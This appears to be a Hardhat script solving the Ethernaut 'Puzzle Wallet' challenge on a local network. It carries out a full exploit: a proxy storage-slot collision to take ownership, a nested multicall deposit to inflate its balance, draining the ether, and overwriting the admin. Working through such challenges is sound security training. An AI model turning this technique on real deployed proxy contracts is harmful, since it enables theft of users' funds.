// const { network, deployments, ethers, getNamedAccounts } = require('hardhat')

// async function main() {
//     const [owner, addr1, addr2] = await ethers.getSigners()

//     const PuzzleWallet = await ethers.getContractFactory('PuzzleWallet')
//     const puzzleWallet = await PuzzleWallet.deploy()
//     await puzzleWallet.deployed()

//     const encodeFunction = new ethers.utils.Interface(['function init()']).encodeFunctionData(`init`, [])

//     const PuzzleProxy = await ethers.getContractFactory('PuzzleProxy')
//     const puzzleProxy = await PuzzleProxy.deploy(owner.address, puzzleWallet.address, encodeFunction)
//     await puzzleProxy.deployed()

//     const PuzzleProxyHack = await ethers.getContractFactory('PuzzleProxyHack')
//     const puzzleProxyHack = await PuzzleProxyHack.connect(addr1).deploy(owner.address, puzzleWallet.address, encodeFunction)
//     await puzzleProxyHack.deployed()

//     const hacker = await PuzzleProxy.connect(addr1)
//     const hackerHack = await PuzzleProxyHack.connect(addr1)

//     // ------------ let's hack -------------
//     console.log(await hacker.owner())

//     await hackerHack.ownerChange()

//     console.log(await hacker.owner())
// }

// // hh run scripts/ethernaut1.js --network hardhat
// main()
//     .then(() => process.exit(0))
//     .catch((error) => {
//         console.error(error)
//         process.exit(1)
//     })

const hre = require('hardhat')

async function niceDeploy(name, ...args) {
    const Blueprint = await hre.ethers.getContractFactory(name)
    let ctr
    if (args) {
        ctr = await Blueprint.deploy(...args)
    } else {
        ctr = await Blueprint.deploy()
    }

    await ctr.deployed()
    console.log('%s deployed to: %s', name, ctr.address)
    return [Blueprint, ctr]
}

async function getSlots(ctr, pos) {
    console.log('----------- Slot Layout ----------------')
    for (let i = 0; i < pos.length; i++) {
        console.log('\tSlot[%d] = ', i, await hre.ethers.provider.getStorageAt(ctr.address, pos[i]))
    }
    console.log('----------------End Layout-----------------------')
}

async function printStatus(proxy, deco) {
    const accounts = await hre.ethers.getSigners()
    console.log('--------------------Status-------------------')
    console.log('Admin: ', await proxy.admin())
    console.log('Owner: ', await deco.owner())
    console.log('Addr0 on WL: ', await deco.whitelisted(accounts[0].address))
    console.log('Addr1 on WL: ', await deco.whitelisted(accounts[1].address))
    console.log('Addr0 bal: ', await deco.balances(accounts[0].address))
    console.log('Addr1 bal ', await deco.balances(accounts[1].address))
    console.log('total bal: ', await hre.ethers.provider.getBalance(proxy.address))
    console.log('---------------------END ------------------')
}

async function main() {
    let tx
    const accounts = await hre.ethers.getSigners()

    const iface = new hre.ethers.utils.Interface(['function init(uint256)', 'function deposit()', 'function multicall(bytes[])'])
    const init_enc = iface.encodeFunctionData('init', [0x12345678])

    const [PuzzleWallet, puzzleWallet] = await niceDeploy('PuzzleWallet')
    const [PuzzleProxy, puzzleProxy] = await niceDeploy('PuzzleProxy', accounts[0].address, puzzleWallet.address, init_enc)
    let deco = PuzzleWallet.attach(puzzleProxy.address)

    tx = await deco.addToWhitelist(accounts[0].address)
    await tx.wait()
    tx = await deco.deposit({ value: 1000 })
    await tx.wait()

    await getSlots(puzzleProxy, [0, 1, 2, 3])
    await printStatus(puzzleProxy, deco)

    const hacker = await puzzleProxy.connect(accounts[1])

    //solution
    tx = await puzzleProxy.connect(accounts[1]).proposeNewAdmin(accounts[1].address)
    await tx.wait()

    await printStatus(puzzleProxy, deco)

    tx = await deco.connect(accounts[1]).addToWhitelist(accounts[1].address)
    await tx.wait()

    await printStatus(puzzleProxy, deco)

    const dep_enc = iface.encodeFunctionData('deposit', [])
    const mul_enc = iface.encodeFunctionData('multicall', [[dep_enc]])

    tx = await deco.connect(accounts[1]).multicall(Array(30).fill(mul_enc), { value: 40 })
    await tx.wait()

    await printStatus(puzzleProxy, deco)

    tx = await deco.connect(accounts[1]).execute(accounts[1].address, 1040, [])
    await tx.wait()

    await printStatus(puzzleProxy, deco)

    tx = await deco.connect(accounts[1]).setMaxBalance(accounts[1].address)
    await tx.wait()

    await printStatus(puzzleProxy, deco)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        process.exit(1)
    })
